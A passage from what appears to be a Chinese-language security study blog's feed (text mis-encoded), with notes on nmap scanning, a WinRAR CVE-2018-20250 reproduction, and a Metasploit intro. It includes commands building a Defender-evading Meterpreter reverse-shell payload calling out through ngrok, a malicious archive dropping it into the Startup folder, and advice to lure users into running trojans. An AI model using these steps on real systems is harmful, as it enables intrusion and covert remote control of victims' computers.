title="å…­ã€åŸºæœ¬ç”¨æ³•"></a>å…­ã€åŸºæœ¬ç”¨æ³•</h2><p><strong>å‘½ä»¤è¡Œæ¨¡å¼</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -h #å¸®åŠ©ä¿¡æ¯</span><br><span class="line">nmap [æ‰«æç±»å‹] [é€‰é¡¹] [ç›®æ ‡]</span><br><span class="line">nmap 192.168.1.100#å¯¹å•ä¸ªç›®æ ‡è¿›è¡Œæ‰«æ</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.11.1</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>ç«¯å£çŠ¶æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">open</span><br><span class="line">closed</span><br><span class="line">filtered #è¢«è¿‡æ»¤çš„ï¼Œæ¢æµ‹åŒ…è¢«æ‹¦æˆªï¼Œæ— æ³•å®šä½è¯¥ç«¯å£æ˜¯å¦å¼€å¯</span><br><span class="line">unfiltered #æœªè¿‡æ»¤çš„ï¼Œæ¢æµ‹åŒ…æ²¡æœ‰è¢«æ‹¦æˆªï¼Œä½†æ˜¯nmapè¿˜æ˜¯æ— æ³•åˆ¤æ–­è¯¥ç«¯å£æ˜¯å¦å¼€å¯</span><br><span class="line">open|filtered #å¼€æ”¾æˆ–è€…è¢«è¿‡æ»¤</span><br><span class="line">close|filtered#å…³é—­æˆ–è€…è¢«è¿‡æ»¤</span><br></pre></td></tr></table></figure><p>æ‰¹é‡æ‰«æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.11.0/24#æ‰«ææ•´ä¸ªç½‘æ®µ</span><br><span class="line">nmap 192.179.1.1-200#æ‰«æ1-200ä¹‹é—´çš„ä¸»æœº</span><br><span class="line">nmap 192.167.1.1,2,7-40</span><br><span class="line">nmap 192.168.168.1.0/24 192.10.1.3.1-200#å¤šç½‘æ®µæ‰«æ</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶æ‰«æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.10.11 &gt; titlename</span><br><span class="line">nmap iL titlenameï¼ˆæ‰«ææ–‡ä»¶ï¼‰</span><br></pre></td></tr></table></figure><p>éšæœºé€‰æ‹©ç›®æ ‡ nmap -iR ï¼Œä¾‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PS80 -iR 0ï¼ˆæ— ä¼‘æ­¢å»æ‰«æï¼‰ -p80</span><br></pre></td></tr></table></figure><p>æ’é™¤æ‰«æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.0/24 --exculde 192.168.1.1,255,4-10</span><br><span class="line">   --exculde æ’é™¤ä¸»æœº/ç½‘ç»œ</span><br><span class="line">nmap -iL scan_file(è¦æ‰«çš„ç›®æ ‡) --exculdefile noscan_file(ä¸éœ€è¦æ‰«)</span><br></pre></td></tr></table></figure><h2 id="ä¸ƒã€å¸¦æœ‰å‚æ•°çš„æ‰«æ"><a href="#ä¸ƒã€å¸¦æœ‰å‚æ•°çš„æ‰«æ" class="headerlink" title="ä¸ƒã€å¸¦æœ‰å‚æ•°çš„æ‰«æ"></a>ä¸ƒã€å¸¦æœ‰å‚æ•°çš„æ‰«æ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-sï¼ˆScanï¼‰</span><br><span class="line">-Tï¼ˆTCPï¼‰</span><br><span class="line"></span><br><span class="line">nmap -sT ä½¿ç”¨-sTå®ç°TCPå…¨è¿æ¥æ‰«æï¼Œæ‰«æè¿‡ç¨‹ä¸­æœ‰ä¸‰æ¬¡æ¡æ‰‹</span><br><span class="line">å»ºç«‹è¿æ¥ åˆ™è¡¨æ˜ç«¯å£å¼€æ”¾ æ‰«æé€Ÿåº¦æ…¢</span><br><span class="line"></span><br><span class="line">nmap -sS 192.168.1.1 ä½¿ç”¨synçš„æ•°æ®åŒ…å»æ¢æµ‹,å¦‚æœæ”¶åˆ°ACKï¼Œåˆ™è¯´æ˜ç«¯å£å¼€æ”¾</span><br><span class="line">nmap -sN -p- 192.168.1.1 NULLæ‰«æï¼Œä¸è®¾ç½®ä»»ä½•æ§åˆ¶ä½</span><br><span class="line">-p ç«¯å£ 1-1000-p-æ‰€æœ‰ç«¯å£</span><br><span class="line">-p20,21,22,23,24,25</span><br><span class="line"></span><br><span class="line">nmap -sV 192.168.1.1-V æ¢æµ‹æœåŠ¡çš„ç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">å°†ç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­</span><br><span class="line">nmap 192.168.1.1 &gt;./result.txt</span><br><span class="line">nmap  -sV 192.168.10.5 -oX  result.html</span><br><span class="line"></span><br><span class="line">nmap -A 192.168.1.1 æ‰€æœ‰æ‰«æç»“æœçš„è¯¦ç»†ä¿¡æ¯ å…¨é¢æ‰«æ</span><br><span class="line">nmap -O 192.168.1.1 æ˜¾ç¤ºæ“ä½œç³»ç»Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure><h2 id="å…«ã€é«˜çº§ç”¨æ³•"><a href="#å…«ã€é«˜çº§ç”¨æ³•" class="headerlink" title="å…«ã€é«˜çº§ç”¨æ³•"></a>å…«ã€é«˜çº§ç”¨æ³•</h2><p><strong>æ‰«æå®‰å…¨æ¼æ´</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--scriptä½¿ç”¨è„šæœ¬æ¢æµ‹æ¼æ´</span><br><span class="line">nmap --scriptè„šæœ¬åç§° ç›®æ ‡</span><br><span class="line">åœ¨nmapçš„å®‰è£…è·¯å¾„ä¸­æœ‰ /script/</span><br><span class="line">åœ¨è¯¥ç›®å½•ä¸­å­˜æ”¾nmapçš„è„šæœ¬</span><br><span class="line"></span><br><span class="line">nmap --script smb-vuln-ms17-010 192.168.11.232</span><br><span class="line">æ°¸æ’ä¹‹è“</span><br><span class="line"></span><br><span class="line">nmap --script smb-check-vulns 192.168.11.232</span><br><span class="line">MS08-067ï¼ˆSMBï¼‰æº¢å‡ºæ¼æ´</span><br><span class="line"></span><br><span class="line">nmap --script ssl-heartbleed 192.168.11.232</span><br><span class="line">æ¢æµ‹å¿ƒè„æ»´è¡€æ¼æ´</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</title>
      <link href="/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/16/CVE-2018-20250-WinRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>WinRAR ä»£ç æ‰§è¡Œç›¸å…³çš„CVE ç¼–å·å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¤ç°æœ€å¼€å§‹çš„WinRARç›®å½•ç©¿è¶Šæ¼æ´ï¼ˆCVE-2018-20250ï¼‰ã€‚</p><h2 id="äºŒã€æ¼æ´è¯¦æƒ…"><a href="#äºŒã€æ¼æ´è¯¦æƒ…" class="headerlink" title="äºŒã€æ¼æ´è¯¦æƒ…"></a>äºŒã€æ¼æ´è¯¦æƒ…</h2><h3 id="1-åŸç†"><a href="#1-åŸç†" class="headerlink" title="1. åŸç†"></a>1. åŸç†</h3><p>WinRARç›®å½•ç©¿è¶Šæ¼æ´ï¼ˆCVE-2018-20250ï¼‰ï¼š</p><p>â€‹    è¯¥æ¼æ´æ˜¯ç”±äºWinRAR æ‰€ä½¿ç”¨çš„ä¸€ä¸ªé™ˆæ—§çš„åŠ¨æ€é“¾æ¥åº“UNACEV2.dllæ‰€é€ æˆçš„ï¼Œè¯¥åŠ¨æ€é“¾æ¥åº“åœ¨2006 å¹´è¢«ç¼–è¯‘ï¼Œæ²¡æœ‰ä»»ä½•çš„åŸºç¡€ä¿æŠ¤æœºåˆ¶(ASLR,DEP ç­‰)ã€‚è¯¥åŠ¨æ€é“¾æ¥åº“çš„ä½œç”¨æ˜¯å¤„ç†ACE æ ¼å¼æ–‡ä»¶ã€‚è€Œåœ¨è§£å‹å¤„ç†è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€å¤„ç›®å½•ç©¿è¶Šæ¼æ´,å…è®¸è§£å‹è¿‡ç¨‹å†™å…¥æ–‡ä»¶è‡³å¼€æœºå¯åŠ¨é¡¹ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><a id="more"></a><p><em>æ¼æ´ç»†èŠ‚</em>: <a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p><h3 id="2-å½±å“ç‰ˆæœ¬"><a href="#2-å½±å“ç‰ˆæœ¬" class="headerlink" title="2. å½±å“ç‰ˆæœ¬"></a>2. å½±å“ç‰ˆæœ¬</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinRAR &lt; 5.70 Beta 1</span><br><span class="line">Bandizip &lt; = 6.2.0.0</span><br><span class="line">å¥½å‹(2345å‹ç¼©) &lt; = 5.9.8.10907</span><br><span class="line">360å‹ç¼© &lt; = 4.0.0.1170</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€æ¼æ´å¤ç°"><a href="#ä¸‰ã€æ¼æ´å¤ç°" class="headerlink" title="ä¸‰ã€æ¼æ´å¤ç°"></a>ä¸‰ã€æ¼æ´å¤ç°</h2><h3 id="1-å‡†å¤‡"><a href="#1-å‡†å¤‡" class="headerlink" title="1. å‡†å¤‡"></a>1. å‡†å¤‡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KaliLinuxï¼ˆ2019.1)</span><br><span class="line">Metasploit(KaliLinux2019.1å·²ç»é›†æˆäº†Metasploit5)</span><br><span class="line">ngrok</span><br></pre></td></tr></table></figure><h3 id="2-ä¸‹è½½EXP"><a href="#2-ä¸‹è½½EXP" class="headerlink" title="2. ä¸‹è½½EXP"></a>2. ä¸‹è½½EXP</h3><p><strong>ä¸‹è½½WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´EXPåˆ©ç”¨æ–‡ä»¶:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WyAtu/CVE-2018-20250.git</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/1552705180118.png" alt="1552705180118"></p><h3 id="3-å¼€å¯ngrok"><a href="#3-å¼€å¯ngrok" class="headerlink" title="3. å¼€å¯ngrok"></a>3. å¼€å¯ngrok</h3><p>æµè§ˆå™¨æ‰“å¼€<a href="https://www.ngrok.com/" target="_blank" rel="noopener">https://www.ngrok.com/</a> è¿›è¡Œè´¦å·ç™»å½•ï¼Œå¼€é€šä¸€ä¸ªå…è´¹çš„éš§é“è½¬å‘ä»£ç†ã€‚</p><p>æŒ‰ç…§é¦–é¡µçš„æ­¥éª¤å»ºç«‹å¦‚ä¸‹è¿æ¥</p><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/343244.png" alt></p><h3 id="4-ç”ŸæˆPayload"><a href="#4-ç”ŸæˆPayload" class="headerlink" title="4. ç”ŸæˆPayload"></a>4. ç”ŸæˆPayload</h3><p>Metasploitç”Ÿæˆå…æ€Payload è½½è·(é’ˆå¯¹Windows10çš„defender)</p><p>ä½¿ç”¨Metasploit5è‡ªå¸¦çš„å…æ€æ¨¡å—ç”ŸæˆPayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe(é€‰æ‹©msf5å…æ€æ¨¡å—)</span><br><span class="line">show info(æ˜¾ç¤ºæ¨¡å—ä¿¡æ¯)</span><br><span class="line">set filename WinRarPayloadTest.exe(è®¾ç½®Payloadåå­— )</span><br><span class="line">set payload windows/meterpreter/reverse_tcp(è®¾ç½®Payloadç±»å‹ )</span><br><span class="line">set lhost tcp://0.tcp.ngrok.io(è®¾ç½®ä¸Šçº¿åœ°å€ï¼Œå¡«å†™Ngrokæ˜ å°„å‡ºå»çš„åœ°å€å³å¯)</span><br><span class="line">set lport 17814(è®¾ç½®ç›‘å¬ç«¯å£ï¼Œå¡«å†™Ngrokæ˜ å°„å‡ºå»çš„ç«¯å£å³å¯ )</span><br><span class="line">run(ç”ŸæˆPayload)</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/sfasfe.png" alt></p><p>æŠŠPayloadæ–‡ä»¶æ”¾åˆ°EXPæ–‡ä»¶å¤¹ä¸‹çš„æ ¹ç›®å½•</p><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/asd57h.png" alt></p><p>æ‰“å¼€exp.pyæ–‡ä»¶æŠŠâ€œcalc.exeâ€œä¿®æ”¹æˆâ€WinRarPayload.exeâ€ä¿å­˜</p><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/sdasdf676.png" alt></p><p>Pythonè¿è¡Œexp.pyæ–‡ä»¶è‡ªåŠ¨åœ¨æ–‡ä»¶æ ¹ç›®å½•ä¸‹ç”Ÿæˆæ¶æ„å‹ç¼©åŒ…ã€‚</p><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/Y4HG8TCD3.png" alt></p><p>å·²ç»æˆåŠŸç”Ÿæˆäº†æ¶æ„çš„å‹ç¼©åŒ…ï¼Œè¿™æ—¶å€™å¯ä»¥å¾€é‡Œé¢æ”¾ä¸€äº›å¼•è¯±æ–‡ä»¶å°±å˜æˆäº†è¯±äººçš„å‹ç¼©åŒ…äº†ã€‚</p><p>Windows7é¶æœºä¸‹è½½è§£å‹è¿™ä¸ªæ¶æ„å‹ç¼©åŒ…ï¼š</p><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/saass.png" alt></p><p>è§£å‹åè‡ªåŠ¨åœ¨ç³»ç»Ÿå¯åŠ¨ç›®å½•ä¸‹è‡ªåŠ¨å‡ºç°æˆ‘ä»¬ä¹‹å‰ç”Ÿæˆçš„Payload</p><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/dfgjhjh456754.png" alt></p><p>Windows7ç³»ç»Ÿå¯åŠ¨ç›®å½•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>Metasploitå¯åŠ¨è¿œç¨‹ç›‘å¬ä¸»æœºä¸Šçº¿è¯·æ±‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.20</span><br><span class="line">set lport 8878</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/%$V6[`8.png" alt></p><p><img src="/2019/03/16/CVE-2018-20250-WinRARè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/2B3X4XPAT0W.png" alt></p><p>ç¡®ä¿ngrokåå°åœ¨è¿è¡Œ,ç„¶åé‡å¯Windows7é¶æœºï¼Œmetasploitç›‘å¬ç­‰å¾…ä¸Šçº¿</p><h3 id="5-éªŒè¯payload"><a href="#5-éªŒè¯payload" class="headerlink" title="5. éªŒè¯payload"></a>5. éªŒè¯payload</h3><p>å¾…æ›´æ–°</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WinRAR </tag>
            
            <tag> Metasploit </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit(MSF)å…¥é—¨</title>
      <link href="/2019/03/14/Metasploit-MSF/"/>
      <url>/2019/03/14/Metasploit-MSF/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€Metasploitä»‹ç»"><a href="#ä¸€ã€Metasploitä»‹ç»" class="headerlink" title="ä¸€ã€Metasploitä»‹ç»"></a>ä¸€ã€Metasploitä»‹ç»</h2><p>ç»¼åˆåˆ©ç”¨å·¥å…·ï¼Œé›†æˆäº†ä¸Šåƒç§æ¼æ´åˆ©ç”¨æ–¹å¼ï¼Œæ“ä½œç®€å•æ˜“ä¸Šæ‰‹ã€‚</p><h2 id="äºŒã€Metasploitå¯åŠ¨"><a href="#äºŒã€Metasploitå¯åŠ¨" class="headerlink" title="äºŒã€Metasploitå¯åŠ¨"></a>äºŒã€Metasploitå¯åŠ¨</h2><p>kalié›†æˆäº†Metasploitæ¡†æ¶ï¼Œä¾èµ–äºpostgresqlæ•°æ®åº“</p><ol><li><p>å…ˆå¯åŠ¨æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li></ol><h2 id="ä¸‰ã€ç”Ÿæˆæœ¨é©¬ç¨‹åº"><a href="#ä¸‰ã€ç”Ÿæˆæœ¨é©¬ç¨‹åº" class="headerlink" title="ä¸‰ã€ç”Ÿæˆæœ¨é©¬ç¨‹åº"></a>ä¸‰ã€ç”Ÿæˆæœ¨é©¬ç¨‹åº</h2><p>åˆ©ç”¨MSFç”Ÿæˆæœ¨é©¬è·å–meterpreteråå¼¹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure><a id="more"></a><p>-p  é€‰ç”¨ä»€ä¹ˆpayload<br>lhost  ç›‘å¬ip<br>lport  ç›‘å¬ç«¯å£<br>-f  ç”Ÿæˆæ–‡ä»¶çš„ç±»å‹</p><h2 id="å››ã€æŠ•æ”¾æœ¨é©¬åˆ°ç›®æ ‡æœºä¸Š"><a href="#å››ã€æŠ•æ”¾æœ¨é©¬åˆ°ç›®æ ‡æœºä¸Š" class="headerlink" title="å››ã€æŠ•æ”¾æœ¨é©¬åˆ°ç›®æ ‡æœºä¸Š"></a>å››ã€æŠ•æ”¾æœ¨é©¬åˆ°ç›®æ ‡æœºä¸Š</h2><h2 id="äº”ã€å¼€å¯ç›‘å¬"><a href="#äº”ã€å¼€å¯ç›‘å¬" class="headerlink" title="äº”ã€å¼€å¯ç›‘å¬"></a>äº”ã€å¼€å¯ç›‘å¬</h2><p>å¯ç”¨MSFï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p><ol><li><p>åŠ è½½expuse </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br></pre></td></tr></table></figure></li><li><p>åŠ è½½payloadï¼ˆè¦å’Œç”Ÿæˆæœ¨é©¬é€‰ç”¨çš„payloadä¸€è‡´ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹å“ªäº›å‚æ•°æ˜¯éœ€è¦è¾“å…¥çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show opptions</span><br><span class="line">#è®¾ç½®ç›‘å¬çš„IP</span><br><span class="line">set lhost 192.168.10.14</span><br><span class="line">#è®¾ç½®ç›‘å¬çš„ç«¯å£</span><br><span class="line">set lport 8787</span><br></pre></td></tr></table></figure></li><li><p>è¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure></li></ol><h2 id="å…­ã€è¿›è¡Œæ¬ºéª—"><a href="#å…­ã€è¿›è¡Œæ¬ºéª—" class="headerlink" title="å…­ã€è¿›è¡Œæ¬ºéª—"></a>å…­ã€è¿›è¡Œæ¬ºéª—</h2><ol><li>è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æˆ‘ä»¬çš„æœ¨é©¬ç¨‹åº</li><li>ç­‰å¾…ç”¨æˆ·ä¸Šçº¿ï¼Œå°±èƒ½å¾—åˆ°meterpreter</li></ol><h2 id="ä¸ƒã€è·å¾—shell"><a href="#ä¸ƒã€è·å¾—shell" class="headerlink" title="ä¸ƒã€è·å¾—shell"></a>ä¸ƒã€è·å¾—shell</h2><ol><li><p>æ‰§è¡Œshell è¿›åˆ°è¢«æ”»å‡»è€…ç”µè„‘çš„ç»ˆç«¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></li><li><p>æ·»åŠ æ·»åŠ ç”¨æˆ·  å¼€æœº3389 è¿æ¥æ¡Œé¢(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨GitHub Pagesæ­å»ºä¸ªäººåšå®¢</title>
      <link href="/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€åˆ›å»ºGitHub-Pages"><a href="#ä¸€ã€åˆ›å»ºGitHub-Pages" class="headerlink" title="ä¸€ã€åˆ›å»ºGitHub Pages"></a>ä¸€ã€åˆ›å»ºGitHub Pages</h2><p>ä½¿ç”¨GitHub Pagesæ­å»ºåšå®¢çš„å¥½å¤„æœ‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. å…¨æ˜¯é™æ€æ–‡ä»¶ï¼Œè®¿é—®é€Ÿåº¦å¿«ï¼›</span><br><span class="line">2. å…è´¹æ–¹ä¾¿ï¼Œä¸ç”¨èŠ±ä¸€åˆ†é’±å°±å¯ä»¥æ­å»ºä¸€ä¸ªè‡ªç”±çš„ä¸ªäººåšå®¢ï¼Œä¸éœ€è¦æœåŠ¡å™¨ä¸éœ€è¦åå°ï¼›</span><br><span class="line">3. å¯ä»¥éšæ„ç»‘å®šè‡ªå·±çš„åŸŸåï¼Œä¸ä»”ç»†çœ‹çš„è¯æ ¹æœ¬çœ‹ä¸å‡ºæ¥ä½ çš„ç½‘ç«™æ˜¯åŸºäºgithubçš„ï¼›</span><br><span class="line">4. æ•°æ®ç»å¯¹å®‰å…¨ï¼ŒåŸºäºgithubçš„ç‰ˆæœ¬ç®¡ç†ï¼Œæƒ³æ¢å¤åˆ°å“ªä¸ªå†å²ç‰ˆæœ¬éƒ½è¡Œï¼›</span><br><span class="line">5. åšå®¢å†…å®¹å¯ä»¥è½»æ¾æ‰“åŒ…ã€è½¬ç§»ã€å‘å¸ƒåˆ°å…¶å®ƒå¹³å°ï¼›</span><br><span class="line">6. ç­‰ç­‰ï¼›</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-é¦–å…ˆåˆ›å»ºå­˜å‚¨åº“"><a href="#1-é¦–å…ˆåˆ›å»ºå­˜å‚¨åº“" class="headerlink" title="1. é¦–å…ˆåˆ›å»ºå­˜å‚¨åº“"></a>1. é¦–å…ˆåˆ›å»ºå­˜å‚¨åº“</h3><p>å‰å¾€<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>å¹¶<a href="https://github.com/new" target="_blank" rel="noopener">åˆ›å»ºä¸€ä¸ª</a>åä¸º<em>username</em> .github.io <a href="https://github.com/new" target="_blank" rel="noopener">çš„æ–°å­˜å‚¨åº“</a>ï¼Œå…¶ä¸­<em>username</em>æ˜¯GitHubä¸Šçš„ç”¨æˆ·åï¼ˆæˆ–ç»„ç»‡åç§°ï¼‰</p><p><img src="/2019/03/13/åˆ©ç”¨github pages+hexo æ­å»ºä¸ªäººåšå®¢/1552609247373.png" alt="1552609247373"></p><p><strong>æ³¨æ„ï¼šå¦‚æœå­˜å‚¨åº“åå­—çš„ç¬¬ä¸€éƒ¨åˆ†ä¸ä½ çš„ç”¨æˆ·åä¸å®Œå…¨åŒ¹é…ï¼Œåˆ™æ— æ³•æ­£å¸¸å·¥ä½œï¼Œå› æ­¤è¯·åŠ¡å¿…æ­£ç¡®ä½¿ç”¨ã€‚</strong></p><h3 id="2-å®‰è£…-Git"><a href="#2-å®‰è£…-Git" class="headerlink" title="2. å®‰è£… Git"></a>2. å®‰è£… Git</h3><ul><li>Windowsï¼šä¸‹è½½å¹¶å®‰è£… <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Macï¼šä½¿ç”¨ <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ï¼š<code>brew install git</code>;æˆ–ä¸‹è½½ <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">å®‰è£…ç¨‹åº</a> å®‰è£…ã€‚</li><li>Linux (Ubuntu, 